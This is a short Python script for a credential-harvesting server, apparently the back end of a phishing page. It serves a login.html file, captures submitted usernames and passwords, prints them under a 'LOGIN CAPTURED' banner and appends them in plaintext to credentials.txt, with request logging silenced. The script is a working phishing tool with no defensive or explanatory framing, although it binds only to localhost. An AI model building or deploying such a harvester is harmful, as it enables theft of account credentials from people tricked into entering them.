from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs
from datetime import datetime

class LoginHandler(BaseHTTPRequestHandler):

    def do_GET(self):
        try:
            file = open("login.html", "rb")
            content = file.read()
            file.close()
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(content)
        except:
            pass

    def do_POST(self):
        try:
            length   = int(self.headers["Content-Length"])
            body     = self.rfile.read(length).decode()
            data     = parse_qs(body)
            username = data.get("username", [""])[0]
            password = data.get("password", [""])[0]
            time     = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            print("")
            print("================================")
            print("       LOGIN CAPTURED")
            print("================================")
            print("  Time     :", time)
            print("  Username :", username)
            print("  Password :", password)
            print("================================")
            file = open("credentials.txt", "a")
            file.write("["+time+"] username="+username+" | password="+password+"\n")
            file.close()
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
        except:
            pass

    def log_message(self, format, *args):
        pass

print("[*] Server running on http://localhost:8080")
print("[*] Waiting for login submissions...")
print("[*] Press Ctrl+C to stop")
server = HTTPServer(("localhost", 8080), LoginHandler)
server.serve_forever()
